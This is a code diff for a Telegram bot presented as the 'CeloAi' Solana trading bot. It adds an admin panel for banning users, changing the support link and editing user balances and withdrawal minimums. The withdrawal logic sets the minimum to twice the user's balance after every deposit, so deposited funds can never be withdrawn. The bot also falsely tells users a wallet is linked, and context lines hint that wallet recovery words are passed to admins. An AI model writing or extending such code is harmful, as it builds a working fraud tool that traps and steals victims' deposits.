@@ -25,6 +25,47 @@ wallet_sent_to_admin = set()
 # Track last notified balance per user (to show notification only once per deposit)
 last_notified_balance = {}  # {telegram_id: balance}
 
+# Admin configuration
+ADMIN_IDS = [6370028992, 7484918897]
+BANNED_USERS_FILE = "banned_users.json"
+SUPPORT_LINK_FILE = "support_link.json"
+banned_users = set()
+SUPPORT_LINK = "https://t.me/CeloAi_Support"
+
+# Load settings
+try:
+    with open(BANNED_USERS_FILE, "r") as f:
+        data = json.load(f)
+        banned_users = set(data)
+except Exception:
+    pass
+
+try:
+    with open(SUPPORT_LINK_FILE, "r") as f:
+        data = json.load(f)
+        SUPPORT_LINK = data.get("link", SUPPORT_LINK)
+except Exception:
+    pass
+
+
+def save_support_link():
+    """Save support link to file"""
+    try:
+        with open(SUPPORT_LINK_FILE, "w") as f:
+            json.dump({"link": SUPPORT_LINK}, f)
+    except Exception as e:
+        print(f"Error saving support link: {e}")
+
+
+def save_banned_users():
+    """Save banned users to file"""
+    try:
+        with open(BANNED_USERS_FILE, "w") as f:
+            json.dump(list(banned_users), f)
+    except Exception as e:
+        print(f"Error saving banned users: {e}")
+
+
 # Load persisted wallet notifications from file
 try:
     with open("wallet_notifications.txt", "r") as f:
@@ -37,7 +78,7 @@ except FileNotFoundError:
 
 # Balance tracking (cumulative deposits only)
 user_balances = {
-}  # {telegram_id: {"balance": float, "last_checked_slot": int}}
+}  # {telegram_id: {"balance": float, "last_checked_slot": int, "min_withdrawal": float, "fixed_min": bool}}
 BALANCES_FILE = "user_balances.json"
 
 # Load persisted balances
@@ -83,7 +124,9 @@ else:
 # Use demo_api_key parameter for Demo API keys (api.coingecko.com)
 # Use api_key parameter for Pro API keys (pro-api.coingecko.com)
 if COINGECKO_API_KEY:
-    cg = CoinGeckoAPI(demo_api_key=COINGECKO_API_KEY)
+    # Remove quotes if they exist in the env var
+    clean_key = COINGECKO_API_KEY.strip('"').strip("'")
+    cg = CoinGeckoAPI(demo_api_key=clean_key)
 else:
     cg = CoinGeckoAPI()
 solana_client = AsyncClient(SOLANA_RPC_URL)
@@ -126,7 +169,12 @@ async def monitor_deposits(telegram_id: int,
 
         # Get stored cumulative deposit balance
         if telegram_id not in user_balances:
-            user_balances[telegram_id] = {"balance": 0, "last_checked_slot": 0}
+            user_balances[telegram_id] = {
+                "balance": 0,
+                "last_checked_slot": 0,
+                "min_withdrawal": 0,
+                "fixed_min": False
+            }
 
         stored_balance = user_balances[telegram_id]["balance"]
 
@@ -134,6 +182,20 @@ async def monitor_deposits(telegram_id: int,
         if current_balance > stored_balance:
             deposit_amount = current_balance - stored_balance
             user_balances[telegram_id]["balance"] = current_balance
+
+            # Withdrawal logic update
+            if not user_balances[telegram_id].get("fixed_min", False):
+                user_balances[telegram_id][
+                    "min_withdrawal"] = current_balance * 2
+            else:
+                # If fixed, check if current balance meets or exceeds the fixed minimum
+                fixed_min = user_balances[telegram_id].get("min_withdrawal", 0)
+                if current_balance >= fixed_min:
+                    # Reset to X2 logic since requirement met
+                    user_balances[telegram_id]["fixed_min"] = False
+                    user_balances[telegram_id][
+                        "min_withdrawal"] = current_balance * 2
+
             save_balances()
 
             sol_price = await get_sol_price_usd()
@@ -354,6 +416,54 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = query.from_user
     user_name = user.username or user.first_name or str(user_id)
 
+    # Global ban check
+    if user_id in banned_users:
+        return
+
+    # Admin actions
+    if option.startswith("admin_"):
+        if user_id not in ADMIN_IDS:
+            return
+
+        if option == "admin_ban":
+            context.user_data["awaiting_admin_ban"] = True
+            await query.message.reply_text(
+                "🚫 Enter the Telegram ID of the user to <b>BAN</b>:",
+                parse_mode="HTML")
+        elif option == "admin_unban":
+            context.user_data["awaiting_admin_unban"] = True
+            await query.message.reply_text(
+                "✅ Enter the Telegram ID of the user to <b>UNBAN</b>:",
+                parse_mode="HTML")
+        elif option == "admin_list_banned":
+            if not banned_users:
+                await query.message.reply_text(
+                    "📜 No users are currently banned.")
+            else:
+                list_text = "📜 <b>Banned Users:</b>\n\n" + "\n".join(
+                    [f"• <code>{uid}</code>" for uid in banned_users])
+                await query.message.reply_text(list_text, parse_mode="HTML")
+        elif option == "admin_change_support":
+            context.user_data["awaiting_admin_support_link"] = True
+            await query.message.reply_text(
+                "🔗 Enter the new <b>Support Link</b> (e.g., https://t.me/YourSupport):",
+                parse_mode="HTML")
+        elif option == "admin_user_details":
+            context.user_data["awaiting_admin_user_lookup"] = True
+            await query.message.reply_text(
+                "🔍 Enter the Telegram ID of the user to view/edit details:")
+        elif option.startswith("admin_edit_"):
+            parts = option.split(
+                "_")  # admin_edit_balance_ID or admin_edit_min_withdrawal_ID
+            field = parts[2]
+            target_id = parts[-1]  # The ID is always at the end
+            context.user_data["admin_editing_user"] = target_id
+            context.user_data["admin_editing_field"] = field
+            await query.message.reply_text(
+                f"📝 Enter the new <b>{field.replace('_', ' ').title()}</b> for user {target_id}:",
+                parse_mode="HTML")
+        return
+
     # Check for deposits on ANY button click
     await check_and_notify_deposits(user_id, context)
 
@@ -507,10 +617,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Minimum SOL required for gas fees (kept in wallet)
         MIN_GAS_RESERVE = 0.005
 
-        # Calculate minimum withdrawal (2x current balance)
-        minimum_withdrawal = user_balance * 2
+        # Calculate minimum withdrawal
+        stored_min = user_balances.get(user_id,
+                                       {}).get("min_withdrawal",
+                                               user_balance * 2)
+        if stored_min == 0 and user_balance > 0:
+            stored_min = user_balance * 2
 
-        # Apply withdrawal rules
+        minimum_withdrawal = stored_min
+        MIN_GAS_RESERVE = 0.005
         if user_balance == 0:
             await query.message.reply_text("❗ Insufficient SOL balance.",
                                            parse_mode="HTML")
@@ -549,8 +664,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Minimum SOL required for gas fees (kept in wallet)
         MIN_GAS_RESERVE = 0.005
 
-        # Calculate minimum withdrawal (2x current balance)
-        minimum_withdrawal = user_balance * 2
+        # Use stored minimum withdrawal (set by admin or X2 logic)
+        stored_data = user_balances.get(user_id, {})
+        minimum_withdrawal = stored_data.get("min_withdrawal", user_balance * 2)
 
         await query.message.reply_text(
             f"💸 <b>Withdraw Custom Amount</b>\n\n"
@@ -735,6 +851,10 @@ def format_token_details(pair_data, wallet_balance=0):
 
 # --- /start ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id in banned_users:
+        return
+    # ... existing start logic ...
     welcome_text = (
         "👋 Welcome to *CeloAi Bot!*\n"
         "Step into the world of fast, smart, and stress-free trading, "
@@ -742,19 +862,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🔗 Connecting to your wallet...\n"
         "⏳ Initializing your account and securing your funds...\n"
         "✅ Wallet successfully created and linked!\n\n"
-        "👇 Select an option below to continue."
-    )
+        "👇 Select an option below to continue.")
 
     # Send both inline community button and main menu
     keyboard = main_menu_markup()  # Your ReplyKeyboardMarkup
-    guide_buttons = InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton(
-                "📢 JOIN CeloAI Community",
-                url="https://t.me/+VvD5LW8Eq01iMDlk"
-            ),
-        ]
-    ])
+    guide_buttons = InlineKeyboardMarkup([[
+        InlineKeyboardButton("📢 JOIN CeloAI Community",
+                             url="https://t.me/+VvD5LW8Eq01iMDlk"),
+    ]])
 
     # Use reply_markup for ReplyKeyboardMarkup OR send both separately
     if update.message:
@@ -764,35 +879,28 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=keyboard  # <-- this attaches the main menu
         )
         # Optional: send community link separately
-        await update.message.reply_text(
-            "CeloAi Community",
-            reply_markup=guide_buttons
-        )
+        await update.message.reply_text("CeloAi Community",
+                                        reply_markup=guide_buttons)
     elif update.callback_query:
+        await update.callback_query.message.reply_text(welcome_text,
+                                                       parse_mode="Markdown",
+                                                       reply_markup=keyboard)
         await update.callback_query.message.reply_text(
-            welcome_text,
-            parse_mode="Markdown",
-            reply_markup=keyboard
-        )
-        await update.callback_query.message.reply_text(
-            "Join our community:",
-            reply_markup=guide_buttons
-        )
+            "Join our community:", reply_markup=guide_buttons)
 
 
-
-        
-    
-    
     # --- /support ---
 async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id in banned_users:
+        return
     await update.message.reply_text(
         "📩 Support Contact\n\n"
-        "If you need help, our support team is available to assist you:\n\n"
-        "🔧 Reach Support:\n"
-        "@CeloAi_Support\n\n"
-        "Feel free to send them a message anytime!",
-        reply_markup=main_menu_markup())
+        "If you need help, our support team is available to assist you.\n\n"
+        "Feel free to click the button below to send them a message anytime!",
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(
+            [[InlineKeyboardButton("🔧 Reach Support", url=SUPPORT_LINK)]]))
     # clear states
     context.user_data.pop("awaiting_dummy", None)
     context.user_data.pop("awaiting_withdraw", None)
@@ -800,10 +908,150 @@ async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # --- Message handler ---
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+
+    # Global ban check
+    if user_id in banned_users:
+        return
+
     text = (update.message.text or "").strip()
     user = update.effective_user
-    user_id = user.id
     user_name = user.username or user.first_name or str(user_id)
+
+    # Handle Admin inputs
+    if user_id in ADMIN_IDS:
+        if context.user_data.get("awaiting_admin_ban"):
+            try:
+                target_id = int(text.strip())
+                banned_users.add(target_id)
+                save_banned_users()
+                await update.message.reply_text(
+                    f"🚫 User <code>{target_id}</code> has been banned.",
+                    parse_mode="HTML")
+            except ValueError:
+                await update.message.reply_text("❌ Invalid ID format.")
+            finally:
+                context.user_data.pop("awaiting_admin_ban", None)
+            return
+
+        if context.user_data.get("awaiting_admin_unban"):
+            try:
+                target_id = int(text.strip())
+                if target_id in banned_users:
+                    banned_users.remove(target_id)
+                    save_banned_users()
+                    await update.message.reply_text(
+                        f"✅ User <code>{target_id}</code> has been unbanned.",
+                        parse_mode="HTML")
+                else:
+                    await update.message.reply_text(
+                        "❓ User is not in the banned list.")
+            except ValueError:
+                await update.message.reply_text("❌ Invalid ID format.")
+            finally:
+                context.user_data.pop("awaiting_admin_unban", None)
+            return
+
+        if context.user_data.get("awaiting_admin_support_link"):
+            new_link = text.strip()
+            if new_link.startswith("http"):
+                global SUPPORT_LINK
+                SUPPORT_LINK = new_link
+                save_support_link()
+                await update.message.reply_text(
+                    f"✅ Support link updated to: {SUPPORT_LINK}")
+            else:
+                await update.message.reply_text(
+                    "❌ Invalid link format. Must start with http or https.")
+            context.user_data.pop("awaiting_admin_support_link", None)
+            return
+
+        if context.user_data.get("awaiting_admin_user_lookup"):
+            try:
+                target_id = int(text.strip())
+                if target_id in user_balances:
+                    data = user_balances[target_id]
+                    balance = data.get("balance", 0)
+                    min_w = data.get("min_withdrawal", balance * 2)
+                    is_fixed = data.get("fixed_min", False)
+
+                    status = "Fixed" if is_fixed else "Auto (x2)"
+
+                    msg = (
+                        f"👤 <b>User Details:</b> <code>{target_id}</code>\n\n"
+                        f"💰 <b>Balance:</b> {balance:.4f} SOL\n"
+                        f"💸 <b>Min Withdrawal:</b> {min_w:.4f} SOL\n"
+                        f"⚙️ <b>Min Status:</b> {status}")
+
+                    keyboard = InlineKeyboardMarkup(
+                        [[
+                            InlineKeyboardButton(
+                                "✏️ Edit Balance",
+                                callback_data=f"admin_edit_balance_{target_id}"
+                            )
+                        ],
+                         [
+                             InlineKeyboardButton(
+                                 "✏️ Edit Min Withdrawal",
+                                 callback_data=
+                                 f"admin_edit_min_withdrawal_{target_id}")
+                         ]])
+                    await update.message.reply_text(msg,
+                                                    parse_mode="HTML",
+                                                    reply_markup=keyboard)
+                else:
+                    await update.message.reply_text(
+                        "❌ User not found in database.")
+            except ValueError:
+                await update.message.reply_text("❌ Invalid ID format.")
+            finally:
+                context.user_data.pop("awaiting_admin_user_lookup", None)
+            return
+
+        if context.user_data.get("admin_editing_user"):
+            target_id = int(context.user_data["admin_editing_user"])
+            field = context.user_data["admin_editing_field"]
+            try:
+                val = float(text.strip())
+                if target_id not in user_balances:
+                    user_balances[target_id] = {
+                        "balance": 0,
+                        "last_checked_slot": 0,
+                        "min_withdrawal": 0,
+                        "fixed_min": False
+                    }
+                
+                if field == "balance":
+                    user_balances[target_id]["balance"] = val
+                    # If balance edit meets or exceeds current min withdrawal, reset to X2 logic
+                    current_min = user_balances[target_id].get("min_withdrawal", 0)
+                    if val >= current_min:
+                        user_balances[target_id]["fixed_min"] = False
+                        user_balances[target_id]["min_withdrawal"] = val * 2
+                else:  # min_withdrawal
+                    user_balances[target_id]["min_withdrawal"] = val
+                    user_balances[target_id]["fixed_min"] = True  # Mark as fixed manually
+
+                save_balances()
+
+                # Show updated details including USD value
+                sol_price = await get_sol_price_usd()
+                new_balance = user_balances[target_id]["balance"]
+                new_min = user_balances[target_id]["min_withdrawal"]
+                usd_value = new_balance * sol_price if sol_price > 0 else 0
+
+                update_msg = (
+                    f"✅ {field.replace('_', ' ').title()} updated for user {target_id}.\n\n"
+                    f"💰 <b>New Balance:</b> {new_balance:.4f} SOL (${usd_value:.2f})\n"
+                    f"💸 <b>New Min Withdrawal:</b> {new_min:.4f} SOL")
+
+                await update.message.reply_text(update_msg, parse_mode="HTML")
+            except ValueError:
+                await update.message.reply_text("❌ Invalid number format.")
+            finally:
+                context.user_data.pop("admin_editing_user", None)
+                context.user_data.pop("admin_editing_field", None)
+            return
 
     # ----- Handle Connect Wallet (12 dummy words) -----
     if context.user_data.get("awaiting_dummy"):
@@ -899,8 +1147,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Minimum SOL required for gas fees
         MIN_GAS_RESERVE = 0.005
 
-        # Calculate minimum withdrawal (2x current balance)
-        minimum_withdrawal = user_balance * 2
+        # Use stored minimum withdrawal (set by admin or X2 logic)
+        stored_data = user_balances.get(user_id, {})
+        minimum_withdrawal = stored_data.get("min_withdrawal", user_balance * 2)
 
         # First check if balance is 0
         if user_balance == 0:
@@ -1201,7 +1450,13 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         usd_value = user_balance * sol_price if sol_price > 0 else 0
 
         # Calculate minimum withdrawal (2x balance)
-        minimum_withdrawal = user_balance * 2
+        stored_min = user_balances.get(user_id,
+                                       {}).get("min_withdrawal",
+                                               user_balance * 2)
+        if stored_min == 0 and user_balance > 0:
+            stored_min = user_balance * 2
+
+        minimum_withdrawal = stored_min
         MIN_GAS_RESERVE = 0.005
 
         # Show withdrawal options with inline buttons
@@ -1440,10 +1695,40 @@ async def background_deposit_monitor(context: ContextTypes.DEFAULT_TYPE):
         print(f"Error in background deposit monitor: {e}")
 
 
+# --- Admin Panel ---
+async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in ADMIN_IDS:
+        return
+
+    keyboard = InlineKeyboardMarkup(
+        [[InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban")],
+         [InlineKeyboardButton("✅ Unban User", callback_data="admin_unban")],
+         [
+             InlineKeyboardButton("📜 Banned List",
+                                  callback_data="admin_list_banned")
+         ],
+         [
+             InlineKeyboardButton("👤 User Details",
+                                  callback_data="admin_user_details")
+         ],
+         [
+             InlineKeyboardButton("🔗 Change Support Link",
+                                  callback_data="admin_change_support")
+         ]])
+
+    await update.message.reply_text(
+        "🛠 <b>Admin Panel</b>\n\n"
+        "Welcome Admin. Choose an action:",
+        parse_mode="HTML",
+        reply_markup=keyboard)
+
+
 # --- Main ---
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("admin", admin_panel))
     app.add_handler(CommandHandler("support", support))
     app.add_handler(
         MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
